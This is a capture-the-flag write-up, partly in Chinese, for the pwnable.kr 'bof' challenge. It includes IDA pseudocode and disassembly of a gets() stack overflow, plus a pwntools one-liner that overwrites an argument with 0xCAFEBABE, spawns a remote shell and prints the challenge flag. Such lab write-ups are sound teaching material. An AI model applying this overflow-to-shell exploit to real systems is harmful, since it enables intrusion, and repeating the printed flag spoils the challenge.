## TARGET
```
bof - 5 pt [writeup] 

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

## WRITEUP
download:
```
wget http://pwnable.kr/bin/bof
wget http://pwnable.kr/bin/bof.c
```

程序调用gets获取字符串s [ebp-2Ch]和传入的参数a1 [ebp+8] 比较，stack overflow padding:0x2C + 0x8。

IDA pseudocode:
```c
unsigned int __cdecl func(int a1)
{
  char s; // [esp+1Ch] [ebp-2Ch]
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  puts("overflow me : ");
  gets(&s);
  if ( a1 == 0xCAFEBABE )
    system("/bin/sh");
  else
    puts("Nah..");
  return __readgsdword(0x14u) ^ v3;
}
```

IDA disassemable：
```asm
.text:0000062C s               = byte ptr -2Ch
.text:0000062C var_C           = dword ptr -0Ch
.text:0000062C arg_0           = dword ptr  8
.text:0000062C
.text:0000062C ; __unwind {
.text:0000062C                 push    ebp
.text:0000062D                 mov     ebp, esp
.text:0000062F                 sub     esp, 48h
.text:00000632                 mov     eax, large gs:14h
.text:00000638                 mov     [ebp+var_C], eax
.text:0000063B                 xor     eax, eax
.text:0000063D                 mov     dword ptr [esp], offset s ; "overflow me : "
.text:00000644                 call    puts
.text:00000649                 lea     eax, [ebp+s]
.text:0000064C                 mov     [esp], eax      ; s
.text:0000064F                 call    gets
.text:00000654                 cmp     [ebp+arg_0], 0CAFEBABEh
.text:0000065B                 jnz     short loc_66B
.text:0000065D                 mov     dword ptr [esp], offset command ; "/bin/sh"
.text:00000664                 call    system
.text:00000669                 jmp     short loc_677
.text:0000066B ; ---------------------------------------------------------------------------
.text:0000066B
.text:0000066B loc_66B:                                ; CODE XREF: func+2F↑j
.text:0000066B                 mov     dword ptr [esp], offset aNah ; "Nah.."
.text:00000672                 call    puts
.text:00000677
.text:00000677 loc_677:                                ; CODE XREF: func+3D↑j
.text:00000677                 mov     eax, [ebp+var_C]
.text:0000067A                 xor     eax, large gs:14h
.text:00000681                 jz      short locret_688
.text:00000683                 call    __stack_chk_fail
.text:00000688 ; ---------------------------------------------------------------------------
.text:00000688
.text:00000688 locret_688:                             ; CODE XREF: func+55↑j
.text:00000688                 leave
.text:00000689                 retn
.text:00000689 ; } // starts at 62C
.text:00000689 func            endp
```

EXP:
```bash
➜  3-bof git:(master) ✗ python -c "from pwn import *;r=remote('pwnable.kr',9000);payload='A'*0x34+'\xBE\xBA\xFE\xCA';r.sendline(payload);r.interactive()"
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls -al
total 52504
drwxr-x---  3 root bof      4096 Oct 23  2016 .
drwxr-xr-x 87 root root     4096 Dec 27 23:17 ..
d---------  2 root root     4096 Jun 12  2014 .bash_history
-r-xr-x---  1 root bof      7348 Sep 12  2016 bof
-rw-r--r--  1 root root      308 Oct 23  2016 bof.c
-r--r-----  1 root bof        32 Jun 11  2014 flag
-rw-------  1 root root 53726989 Jun 26 18:23 log
-rw-r--r--  1 root root        0 Oct 23  2016 log2
-rwx------  1 root root      760 Sep 10  2014 super.pl
$ cat flag
daddy, I just pwned a buFFer :)

```

## TIPS
canary is got from gs:14 and saved in [ebp-0xC].
```asm
.text:0000062C                 push    ebp
.text:0000062D                 mov     ebp, esp
.text:0000062F                 sub     esp, 48h
.text:00000632                 mov     eax, large gs:14h
.text:00000638                 mov     [ebp+var_C], eax
```